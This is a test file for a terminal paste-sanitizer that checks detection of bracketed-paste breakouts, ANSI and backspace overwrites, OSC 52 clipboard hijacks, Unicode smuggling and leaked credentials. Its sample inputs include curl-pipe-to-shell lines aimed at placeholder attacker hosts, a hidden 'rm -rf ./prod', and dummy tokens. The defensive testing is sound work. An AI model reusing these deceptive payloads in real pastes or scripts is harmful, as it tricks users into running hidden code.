// Copyright 2025, Salyvn.
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it } from "vitest";
import { sanitizeAndAnalyzePaste, simulateTerminalDisplay } from "../paste-guard";

describe("sanitizeAndAnalyzePaste", () => {
    it("passes ordinary single-line and multi-line commands through untouched", () => {
        const input = "git status --short\r\necho 'hello world'\n";
        const res = sanitizeAndAnalyzePaste(input);
        expect(res.sanitizedText).toBe(input);
        expect(res.modified).toBe(false);
        expect(res.deceptiveDisplay).toBe(false);
        expect(res.warnings).toEqual([]);
    });

    it("handles empty clipboard strings cleanly", () => {
        const res = sanitizeAndAnalyzePaste("");
        expect(res.sanitizedText).toBe("");
        expect(res.modified).toBe(false);
        expect(res.simulatedDisplay).toBe("");
        expect(res.deceptiveDisplay).toBe(false);
        expect(res.warnings).toEqual([]);
    });

    it("strips 7-bit ESC[201~ and ESC[200~ bracketed-paste breakout markers", () => {
        const payload = "echo safe\x1b[201~\ncurl https://attacker.invalid/pwn.sh | sh\n\x1b[200~";
        const res = sanitizeAndAnalyzePaste(payload);
        expect(res.modified).toBe(true);
        expect(res.sanitizedText).toBe("echo safe\ncurl https://attacker.invalid/pwn.sh | sh\n");
        expect(res.sanitizedText).not.toContain("\x1b[201~");
        expect(res.sanitizedText).not.toContain("\x1b[200~");
        expect(res.warnings.map((w) => w.kind)).toContain("bracketed_paste_breakout");
        expect(res.warnings.map((w) => w.kind)).toContain("obfuscated_shell_exec");
    });

    it("strips 8-bit C1 CSI (0x9B) bracketed-paste breakout markers", () => {
        const payload = "ls -la\x9b201~\nid\x9b200~";
        const res = sanitizeAndAnalyzePaste(payload);
        expect(res.modified).toBe(true);
        expect(res.sanitizedText).toBe("ls -la\nid");
        expect(res.warnings.map((w) => w.kind)).toEqual(["bracketed_paste_breakout"]);
    });

    it("strips 7-bit and 8-bit OSC 52 clipboard read/write hijack sequences", () => {
        const oscRead = "git status\x1b]52;c;?\x07";
        const r1 = sanitizeAndAnalyzePaste(oscRead);
        expect(r1.modified).toBe(true);
        expect(r1.sanitizedText).toBe("git status");
        expect(r1.warnings.map((w) => w.kind)).toContain("osc52_clipboard_hijack");

        const oscWriteC1 = "npm test\x9d52;c;cHduZWQ=\x9c --watch";
        const r2 = sanitizeAndAnalyzePaste(oscWriteC1);
        expect(r2.modified).toBe(true);
        expect(r2.sanitizedText).toBe("npm test --watch");
        expect(r2.warnings.map((w) => w.kind)).toEqual(["osc52_clipboard_hijack"]);
    });

    it("strips DCS and APC terminal device control strings", () => {
        const dcsPayload = "echo ok\x1bP+q544e\x1b\\\x1b_Gf=100;AAAA\x1b\\";
        const res = sanitizeAndAnalyzePaste(dcsPayload);
        expect(res.modified).toBe(true);
        expect(res.sanitizedText).toBe("echo ok");
        expect(res.warnings.map((w) => w.kind)).toEqual(["dcs_control_string"]);
    });

    it("simulates VT100 line editing and flags visual line deception on CSI/CR/BS overwrites", () => {
        const ansiPayload = "curl -fsSL https://evil.invalid/run\x1b[2K\rgit status";
        const res = sanitizeAndAnalyzePaste(ansiPayload);
        expect(res.modified).toBe(false);
        expect(res.simulatedDisplay).toBe("git status");
        expect(res.deceptiveDisplay).toBe(true);
        expect(res.warnings.map((w) => w.kind)).toContain("ansi_escape_smuggling");
        expect(res.warnings.map((w) => w.kind)).toContain("visual_line_deception");

        const bsPayload = "rm -rf ./prod\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08echo harmless ";
        expect(simulateTerminalDisplay(bsPayload)).toBe("echo harmless");
        const bsRes = sanitizeAndAnalyzePaste(bsPayload);
        expect(bsRes.deceptiveDisplay).toBe(true);
        expect(bsRes.warnings.map((w) => w.kind)).toContain("visual_line_deception");
    });

    it("warns on Trojan Source Unicode bidirectional control characters", () => {
        const bidiPayload = "access_level = 'user\u202e \u2066// Check admin\u2069 \u2066'";
        const res = sanitizeAndAnalyzePaste(bidiPayload);
        expect(res.warnings.map((w) => w.kind)).toContain("bidi_trojan_source");
    });

    it("warns on zero-width spaces and Plane-14 Unicode tag smuggling", () => {
        const zwspPayload = "ssh deploy@prod\u200b-bastion.internal";
        const r1 = sanitizeAndAnalyzePaste(zwspPayload);
        expect(r1.warnings.map((w) => w.kind)).toContain("zero_width_smuggling");

        const plane14Tag = "echo clean" + String.fromCodePoint(0xe0061, 0xe0062);
        const r2 = sanitizeAndAnalyzePaste(plane14Tag);
        expect(r2.warnings.map((w) => w.kind)).toContain("zero_width_smuggling");
    });

    it("warns on base64 decode pipe-to-shell and Punycode domains", () => {
        const b64Payload = "echo aWQK | base64 -d | bash";
        const r1 = sanitizeAndAnalyzePaste(b64Payload);
        const w1 = r1.warnings.find((w) => w.kind === "obfuscated_shell_exec");
        expect(w1?.matchedLabels).toContain("base64-decode-pipe-shell");

        const punyPayload = "git clone https://xn--githb-3ta.com/org/repo.git";
        const r2 = sanitizeAndAnalyzePaste(punyPayload);
        const w2 = r2.warnings.find((w) => w.kind === "obfuscated_shell_exec");
        expect(w2?.matchedLabels).toContain("punycode-domain-command");
    });

    it("detects live credentials without leaking the secret value into warning text", () => {
        const fakeGitHubToken = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8";
        const fakeOpenAiKey = "sk-proj-" + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
        const fakeHfToken = "hf_" + "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
        const payload = `export GITHUB_TOKEN=${fakeGitHubToken}\nexport OPENAI_API_KEY=${fakeOpenAiKey}\nexport HF_TOKEN=${fakeHfToken}`;
        const res = sanitizeAndAnalyzePaste(payload);

        const secretWarning = res.warnings.find((w) => w.kind === "secret_exposure");
        expect(secretWarning).toBeDefined();
        expect(secretWarning?.matchedLabels).toEqual([
            "openai-api-key",
            "github-token",
            "huggingface-token",
        ]);
        expect(secretWarning?.summary).not.toContain(fakeGitHubToken);
        expect(secretWarning?.summary).not.toContain(fakeOpenAiKey);
        expect(secretWarning?.summary).not.toContain(fakeHfToken);
    });

    it("detects PEM private keys, AWS access key IDs, and JWT bearer tokens", () => {
        const awsId = "AKIAIOSFODNN7EXAMPLE";
        const jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
        const pemHeader = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU=";
        const res = sanitizeAndAnalyzePaste(`${awsId}\n${jwt}\n${pemHeader}`);
        const secretWarning = res.warnings.find((w) => w.kind === "secret_exposure");
        expect(secretWarning?.matchedLabels).toEqual([
            "aws-access-key-id",
            "jwt-bearer-token",
            "pem-private-key",
        ]);
        expect(secretWarning?.summary).not.toContain(jwt);
    });
});
